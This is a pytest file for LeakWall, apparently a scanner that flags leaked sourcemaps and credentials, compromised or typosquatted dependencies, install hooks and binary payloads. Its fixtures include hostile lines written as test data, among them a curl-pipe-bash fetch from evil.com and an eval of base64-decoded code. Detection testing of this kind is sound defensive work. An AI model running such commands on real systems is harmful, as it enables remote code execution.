"""Tests for LeakWall scanner."""

import json
import tempfile
from pathlib import Path

from leakwall.scanner import Finding, Scanner, ScanResult, Severity, _check_typosquat, _edit_distance


class TestSourcemapDetection:
    def test_detects_inline_sourcemap(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "app.js").write_text(
                'console.log("hi");\n//# sourceMappingURL=data:application/json;base64,abc123\n'
            )
            result = Scanner().scan_directory(td)
            assert any(f.rule == "sourcemap_leak" for f in result.findings)

    def test_detects_external_sourcemap_ref(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "bundle.js").write_text(
                'var x = 1;\n//# sourceMappingURL=bundle.js.map\n'
            )
            result = Scanner().scan_directory(td)
            assert any(f.rule == "sourcemap_leak" for f in result.findings)

    def test_detects_map_file(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "cli.js.map").write_text('{"version":3}')
            result = Scanner().scan_directory(td)
            assert any(f.rule == "dangerous_file" and ".map" in f.description for f in result.findings)

    def test_clean_js_passes(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "index.js").write_text('module.exports = { hello: "world" };\n')
            result = Scanner().scan_directory(td)
            assert not any(f.rule == "sourcemap_leak" for f in result.findings)


class TestCredentialDetection:
    def test_detects_api_key(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "config.js").write_text('const API_KEY = "sk-ant-abc123def456ghi789jkl012mno";\n')
            result = Scanner().scan_directory(td)
            assert any(f.rule == "credential_leak" for f in result.findings)

    def test_detects_aws_key(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "aws.py").write_text('AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n')
            result = Scanner().scan_directory(td)
            assert any(f.rule == "credential_leak" for f in result.findings)

    def test_detects_private_key_file(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "server.pem").write_text("-----BEGIN PRIVATE KEY-----\nMIIE...\n")
            result = Scanner().scan_directory(td)
            dangerous = [f for f in result.findings if f.rule == "dangerous_file"]
            assert len(dangerous) >= 1

    def test_detects_github_token(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "ci.sh").write_text('GITHUB_TOKEN="ghp_abcdefghijklmnopqrstuvwxyz1234567890"\n')
            result = Scanner().scan_directory(td)
            assert any(f.rule == "credential_leak" for f in result.findings)

    def test_redacts_match(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "leak.js").write_text('const key = "sk-ant-verylongsecretkeythatshouldberedacted";\n')
            result = Scanner().scan_directory(td)
            cred_findings = [f for f in result.findings if f.rule == "credential_leak"]
            for f in cred_findings:
                if f.match:
                    assert "***" in f.match


class TestFeatureFlagDetection:
    def test_detects_feature_gate(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "app.ts").write_text('if (feature("KAIROS")) { enableDream(); }\n')
            result = Scanner().scan_directory(td)
            assert any(f.rule == "feature_flag" for f in result.findings)

    def test_detects_internal_env_var(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "config.js").write_text('const debug = process.env.INTERNAL_DEBUG_MODE;\n')
            result = Scanner().scan_directory(td)
            assert any(f.rule == "feature_flag" for f in result.findings)


class TestCompromisedDeps:
    def test_detects_compromised_axios(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "package.json").write_text(json.dumps({
                "dependencies": {"axios": "1.14.1"}
            }))
            result = Scanner().scan_directory(td)
            assert any(f.rule == "compromised_dependency" and "axios" in f.description for f in result.findings)

    def test_detects_compromised_telnyx(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "requirements.txt").write_text("telnyx==4.87.1\n")
            result = Scanner().scan_directory(td)
            assert any(f.rule == "compromised_dependency" for f in result.findings)

    def test_safe_axios_passes(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "package.json").write_text(json.dumps({
                "dependencies": {"axios": "1.13.5"}
            }))
            result = Scanner().scan_directory(td)
            assert not any(f.rule == "compromised_dependency" for f in result.findings)

    def test_detects_postinstall_script(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "package.json").write_text(json.dumps({
                "scripts": {"postinstall": "node setup.js"}
            }))
            result = Scanner().scan_directory(td)
            assert any(f.rule == "install_script" for f in result.findings)


class TestDangerousFiles:
    def test_detects_env_file(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / ".env").write_text("SECRET=abc\n")
            result = Scanner().scan_directory(td)
            assert any(f.rule == "dangerous_file" for f in result.findings)

    def test_detects_npmrc(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / ".npmrc").write_text("//registry.npmjs.org/:_authToken=npm_abc\n")
            result = Scanner().scan_directory(td)
            assert any(f.rule == "dangerous_file" for f in result.findings)


class TestScanResult:
    def test_passed_when_clean(self) -> None:
        result = ScanResult(target="test", findings=[], files_scanned=10)
        assert result.passed

    def test_failed_on_critical(self) -> None:
        result = ScanResult(target="test", findings=[
            Finding(rule="test", severity=Severity.CRITICAL, file_path="x", description="bad")
        ])
        assert not result.passed

    def test_summary_format(self) -> None:
        result = ScanResult(target="test", findings=[], files_scanned=5)
        assert "PASSED" in result.summary()
        assert "5 files" in result.summary()


class TestDangerousScripts:
    def test_detects_curl_pipe_bash(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "install.sh").write_text('curl https://evil.com/setup.sh | bash\n')
            result = Scanner().scan_directory(td)
            assert any(f.rule == "dangerous_script" for f in result.findings)

    def test_detects_eval_base64(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "payload.js").write_text('eval(Buffer.from("base64data", "base64").toString());\n')
            result = Scanner().scan_directory(td)
            assert any(f.rule == "dangerous_script" for f in result.findings)


# --- Enhancement Tests ---


class TestLockfileScanning:
    def test_detects_compromised_in_package_lock(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            lock_data = {
                "name": "my-app",
                "version": "1.0.0",
                "lockfileVersion": 3,
                "packages": {
                    "": {"name": "my-app", "version": "1.0.0"},
                    "node_modules/axios": {"version": "1.14.1"},
                    "node_modules/lodash": {"version": "4.17.21"},
                },
            }
            (Path(td) / "package-lock.json").write_text(json.dumps(lock_data))
            result = Scanner().scan_directory(td)
            compromised = [f for f in result.findings if f.rule == "compromised_dependency"]
            assert any("axios" in f.description and "1.14.1" in f.description for f in compromised)

    def test_detects_compromised_in_pnpm_lock(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            pnpm_content = """lockfileVersion: '9.0'

packages:
  'axios@1.14.1':
    resolution: {integrity: sha512-abc123}
  'lodash@4.17.21':
    resolution: {integrity: sha512-def456}
"""
            (Path(td) / "pnpm-lock.yaml").write_text(pnpm_content)
            result = Scanner().scan_directory(td)
            compromised = [f for f in result.findings if f.rule == "compromised_dependency"]
            assert any("axios" in f.description and "1.14.1" in f.description for f in compromised)

    def test_detects_compromised_in_yarn_lock(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            yarn_content = """# THIS IS AN AUTOGENERATED FILE.
axios@^1.14.0:
  version "1.14.1"
  resolved "https://registry.yarnpkg.com/axios/-/axios-1.14.1.tgz#abc"

lodash@^4.17.0:
  version "4.17.21"
  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz#def"
"""
            (Path(td) / "yarn.lock").write_text(yarn_content)
            result = Scanner().scan_directory(td)
            compromised = [f for f in result.findings if f.rule == "compromised_dependency"]
            assert any("axios" in f.description and "1.14.1" in f.description for f in compromised)

    def test_detects_compromised_in_pipfile_lock(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            pipfile_data = {
                "_meta": {"hash": {"sha256": "abc"}},
                "default": {
                    "telnyx": {"version": "==4.87.1"},
                    "requests": {"version": "==2.31.0"},
                },
                "develop": {},
            }
            (Path(td) / "Pipfile.lock").write_text(json.dumps(pipfile_data))
            result = Scanner().scan_directory(td)
            compromised = [f for f in result.findings if f.rule == "compromised_dependency"]
            assert any("telnyx" in f.description for f in compromised)

    def test_detects_compromised_in_uv_lock(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            uv_content = """version = 1

[[package]]
name = "telnyx"
version = "4.87.1"
source = { registry = "https://pypi.org/simple" }

[[package]]
name = "requests"
version = "2.31.0"
source = { registry = "https://pypi.org/simple" }
"""
            (Path(td) / "uv.lock").write_text(uv_content)
            result = Scanner().scan_directory(td)
            compromised = [f for f in result.findings if f.rule == "compromised_dependency"]
            assert any("telnyx" in f.description for f in compromised)

    def test_detects_compromised_in_poetry_lock(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            poetry_content = """[[package]]
name = "telnyx"
version = "4.87.2"
description = "Telnyx Python SDK"

[[package]]
name = "requests"
version = "2.31.0"
description = "HTTP library"
"""
            (Path(td) / "poetry.lock").write_text(poetry_content)
            result = Scanner().scan_directory(td)
            compromised = [f for f in result.findings if f.rule == "compromised_dependency"]
            assert any("telnyx" in f.description for f in compromised)

    def test_safe_lockfile_passes(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            lock_data = {
                "name": "my-app",
                "version": "1.0.0",
                "lockfileVersion": 3,
                "packages": {
                    "": {"name": "my-app", "version": "1.0.0"},
                    "node_modules/lodash": {"version": "4.17.21"},
                    "node_modules/express": {"version": "4.18.2"},
                },
            }
            (Path(td) / "package-lock.json").write_text(json.dumps(lock_data))
            result = Scanner().scan_directory(td)
            assert not any(f.rule == "compromised_dependency" for f in result.findings)


class TestTyposquatDetection:
    def test_detects_axois_typosquat(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "package.json").write_text(json.dumps({
                "dependencies": {"axois": "1.0.0"}
            }))
            result = Scanner().scan_directory(td)
            typos = [f for f in result.findings if f.rule == "typosquat_suspect"]
            assert any("axois" in f.description and "axios" in f.description for f in typos)

    def test_detects_reqeusts_typosquat(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "requirements.txt").write_text("reqeusts==2.31.0\n")
            result = Scanner().scan_directory(td)
            typos = [f for f in result.findings if f.rule == "typosquat_suspect"]
            assert any("reqeusts" in f.description and "requests" in f.description for f in typos)

    def test_real_package_no_alert(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "package.json").write_text(json.dumps({
                "dependencies": {"axios": "1.13.5", "express": "4.18.0", "lodash": "4.17.21"}
            }))
            result = Scanner().scan_directory(td)
            assert not any(f.rule == "typosquat_suspect" for f in result.findings)

    def test_edit_distance_basic(self) -> None:
        assert _edit_distance("axios", "axois") == 2
        assert _edit_distance("requests", "reqeusts") == 2
        assert _edit_distance("abc", "abc") == 0
        assert _edit_distance("abc", "abd") == 1

    def test_check_typosquat_exact_match_returns_none(self) -> None:
        assert _check_typosquat("axios", "npm") is None
        assert _check_typosquat("requests", "pypi") is None

    def test_check_typosquat_suffix_pattern(self) -> None:
        assert _check_typosquat("expresss", "npm") == "express"
        assert _check_typosquat("expressjs", "npm") == "express"


class TestBinaryPayload:
    def test_detects_exe_in_package(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            exe_file = Path(td) / "native.node"
            exe_file.write_bytes(b"MZ" + b"\x00" * 100)
            result = Scanner().scan_directory(td)
            binary_findings = [f for f in result.findings if f.rule == "binary_payload"]
            assert any("Windows PE executable" in f.description for f in binary_findings)

    def test_detects_elf_in_package(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            elf_file = Path(td) / "native.so"
            elf_file.write_bytes(b"\x7fELF" + b"\x00" * 100)
            result = Scanner().scan_directory(td)
            binary_findings = [f for f in result.findings if f.rule == "binary_payload"]
            assert any("Linux ELF executable" in f.description for f in binary_findings)

    def test_detects_macho_in_package(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            macho_file = Path(td) / "native.dylib"
            macho_file.write_bytes(b"\xcf\xfa\xed\xfe" + b"\x00" * 100)
            result = Scanner().scan_directory(td)
            binary_findings = [f for f in result.findings if f.rule == "binary_payload"]
            assert any("macOS Mach-O executable" in f.description for f in binary_findings)

    def test_detects_child_process_in_binary(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            wasm_file = Path(td) / "malicious.wasm"
            wasm_file.write_bytes(b"\x00\x00" + b"require('child_process')" + b"\x00" * 50)
            result = Scanner().scan_directory(td)
            binary_findings = [f for f in result.findings if f.rule == "binary_payload"]
            assert any("child_process" in f.description for f in binary_findings)

    def test_normal_binary_passes(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            normal_file = Path(td) / "data.node"
            # Random non-suspicious bytes
            normal_file.write_bytes(bytes(range(256)) * 4)
            result = Scanner().scan_directory(td)
            binary_findings = [f for f in result.findings if f.rule == "binary_payload"]
            assert len(binary_findings) == 0


class TestAdvisoryFeed:
    def test_builtin_advisories_present(self) -> None:
        from leakwall.advisory import AdvisoryFeed
        feed = AdvisoryFeed(cache_dir=tempfile.mkdtemp())
        advisories = feed.get_advisories()
        assert len(advisories) >= 15  # builtins

    def test_is_compromised_finds_axios(self) -> None:
        from leakwall.advisory import AdvisoryFeed
        feed = AdvisoryFeed(cache_dir=tempfile.mkdtemp())
        result = feed.is_compromised("axios", "1.14.1")
        assert result is not None
        assert result.package == "axios"

    def test_is_compromised_safe_version(self) -> None:
        from leakwall.advisory import AdvisoryFeed
        feed = AdvisoryFeed(cache_dir=tempfile.mkdtemp())
        result = feed.is_compromised("axios", "1.13.5")
        assert result is None

    def test_cache_roundtrip(self) -> None:
        from leakwall.advisory import AdvisoryFeed, Advisory
        with tempfile.TemporaryDirectory() as td:
            feed = AdvisoryFeed(cache_dir=td)
            feed._save_cache([Advisory("test", "1.0", "npm", "test advisory", "test")])
            loaded = feed._load_cache()
            assert len(loaded) == 1
            assert loaded[0].package == "test"

    def test_is_compromised_finds_event_stream(self) -> None:
        from leakwall.advisory import AdvisoryFeed
        feed = AdvisoryFeed(cache_dir=tempfile.mkdtemp())
        result = feed.is_compromised("event-stream", "3.3.6")
        assert result is not None
        assert "flatmap-stream" in result.description

    def test_is_compromised_finds_node_ipc(self) -> None:
        from leakwall.advisory import AdvisoryFeed
        feed = AdvisoryFeed(cache_dir=tempfile.mkdtemp())
        result = feed.is_compromised("node-ipc", "10.1.1")
        assert result is not None

    def test_get_advisories_includes_all_builtins(self) -> None:
        from leakwall.advisory import AdvisoryFeed, _BUILTIN
        feed = AdvisoryFeed(cache_dir=tempfile.mkdtemp())
        advisories = feed.get_advisories()
        for builtin in _BUILTIN:
            assert any(
                a.package == builtin.package and a.version == builtin.version
                for a in advisories
            ), f"Missing builtin: {builtin.package}@{builtin.version}"


class TestScannerWithAdvisoryFeed:
    """Test that Scanner uses AdvisoryFeed instead of hardcoded dict."""

    def test_scanner_detects_event_stream(self) -> None:
        """event-stream is in AdvisoryFeed builtins but was NOT in old hardcoded dict."""
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "package.json").write_text(json.dumps({
                "dependencies": {"event-stream": "3.3.6"}
            }))
            result = Scanner().scan_directory(td)
            assert any(
                f.rule == "compromised_dependency" and "event-stream" in f.description
                for f in result.findings
            )

    def test_scanner_accepts_custom_feed(self) -> None:
        from leakwall.advisory import AdvisoryFeed
        feed = AdvisoryFeed(cache_dir=tempfile.mkdtemp())
        scanner = Scanner(feed=feed)
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "package.json").write_text(json.dumps({
                "dependencies": {"axios": "1.14.1"}
            }))
            result = scanner.scan_directory(td)
            assert any(f.rule == "compromised_dependency" for f in result.findings)
